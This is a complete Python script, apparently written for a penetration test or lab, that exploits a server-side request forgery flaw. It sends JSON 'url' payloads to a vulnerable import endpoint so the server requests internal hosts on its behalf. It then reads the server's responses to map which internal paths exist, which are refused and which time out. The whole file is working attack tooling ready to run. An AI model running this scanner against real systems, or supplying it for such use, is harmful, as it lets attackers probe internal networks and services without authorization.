#!/usr/bin/env python3

"""
Usage:
python3 ssrf_path_scanner.py -t http://apigateway:8000/files/import -s http://172.16.16.5:9000 -p paths.txt --timeout 5
"""

import argparse
import requests

# Argument parsing
parser = argparse.ArgumentParser(description="SSRF-based path scanner via a proxy endpoint.")
parser.add_argument('-t', '--target', help='Host/IP to target (the SSRF vulnerable endpoint)', required=True)
parser.add_argument('-s', '--ssrf', help='SSRF target (the internal host to probe)', required=True)
parser.add_argument('-p', '--paths', help='File with list of paths to test', required=True)
parser.add_argument('--timeout', help='Request timeout in seconds (default: 3)', type=int, default=3)
parser.add_argument('-v', '--verbose', help='Enable verbose mode', action='store_true')

args = parser.parse_args()

# Read all paths into a list
try:
    with open(args.paths, 'r') as f:
        paths = [line.strip() for line in f if line.strip()]
except Exception as e:
    print(f"Error reading paths file: {e}")
    exit(1)

# Scan each path
for endpoint in paths:
    full_url = f"{args.ssrf}{endpoint}"
    payload = {"url": full_url}
    try:
        response = requests.post(url=args.target, json=payload, timeout=args.timeout)

        if args.verbose:
            print(f"{endpoint}\tVERBOSE: {response.text.strip()}")

        if "Request failed with status code 404" in response.text:
            print(f"{endpoint}\tDOES NOT EXIST: {response.text.strip()[:200]}")
        elif "ECONNREFUSED" in response.text:
            print(f"{args.ssrf} does not seem to be up: {response.text.strip()[:200]}")
        else:
            print(f"{endpoint}\tEXISTS: {response.text.strip()[:200]}")  # limit output length

    except requests.exceptions.Timeout:
        print(f"{endpoint}\tTIMED OUT")
    except requests.exceptions.RequestException as e:
        print(f"{endpoint}\tERROR: {e}")
